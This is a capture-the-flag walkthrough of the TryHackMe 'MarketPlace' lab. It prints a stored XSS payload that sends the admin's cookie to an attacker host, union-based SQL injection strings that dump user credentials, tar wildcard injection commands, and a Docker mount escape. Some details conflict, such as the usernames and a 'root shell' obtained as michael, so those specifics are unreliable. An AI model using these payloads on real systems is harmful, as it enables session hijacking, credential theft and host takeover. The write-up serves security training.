🚀 Walkthrough: MarketPlace (TryHackMe)
Platform: TryHackMe
Room: MarketPlace
Difficulty: Medium
Focus Areas: XSS Exploitation, Cookie Hijacking, SQL Injection, Privilege Escalation, Docker Escape

🧠 Penetration Testing Methodology

    🔍 Reconnaissance

    🔎 Enumeration

    🎯 Exploitation

    ⬆️ Privilege Escalation

🔍 Reconnaissance

We begin by scanning the target with nmap, revealing the following open ports:

    22 (SSH)

    80 (HTTP)

nmap -sC -sV -T4 -p- <target-ip>

🔎 Enumeration

Upon visiting the website hosted on port 80, we notice:

    A functional sign-up and login system

    Ability to add custom listings

    Option to report listings to the administrator

🔥 Stored XSS Vulnerability

    When creating a new listing, input is not properly sanitized.

    We inject a JavaScript payload into the listing:

<script>document.location="http://<attacker-ip>:<port>/i.php?cookie="+document.cookie</script>

    Once the listing is reported, the admin views it, and their session cookie is exfiltrated via a Netcat listener.

nc -lvnp <port>

    Replacing our session cookie with the captured admin cookie grants us access to the admin panel and the first flag.

💥 Exploitation

Within the Administration Panel, we find a vulnerable endpoint:

/admin?user=<id>

Injecting SQL characters like ' reveals a SQL error, confirming the injection point.

We now leverage SQLi (Union-based) to enumerate and dump data.
🧪 SQL Injection Payloads

    Database Name

/admin?user=10 UNION SELECT database(),2,3,4--

Tables in DB

/admin?user=10 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--

Columns in users table

/admin?user=10 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--

Dump credentials

/admin?user=10 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3,4 FROM users--

Dump messages table

    /admin?user=10 UNION SELECT 1,GROUP_CONCAT(message_content),3,4 FROM messages--

📌 The messages contain sensitive information — specifically, SSH credentials for a set of users (system, jack, michael).

We brute-force logins using hydra and discover valid credentials for the user: jake
🔐 Privilege Escalation
✅ Initial Shell

Login via SSH as jake:

ssh jake@<target-ip>

Grab user.txt from home directory.
🔎 Sudo Misconfiguration

Using sudo -l, we learn:

jake can execute /opt/backups/backup.sh as michael

Inspecting the backup.sh script, it uses a wildcard (*) in a vulnerable context — allowing us to inject arbitrary commands.
🔧 Exploiting Wildcard Injection

Create two files:

echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"

Execute the vulnerable script as michael:

sudo -u michael /opt/backups/backup.sh

Gain a root shell:

/tmp/rootbash -p

🐳 Docker Escape to Root

Inside the container, mount the host system:

mkdir /mnt/rootfs
docker run -v /:/mnt/rootfs -it ubuntu chroot /mnt/rootfs

Access the final flag:

cat /root/root.txt

🧠 Lessons Learned

    🔐 Web apps with admin review + XSS = Cookie Hijack 101

    🛡️ SQL Injection still reigns when input isn’t sanitized

    🐚 Sudo misconfigs and wildcard injections are dangerous combo

    🐳 Docker misconfigs allow full host compromise
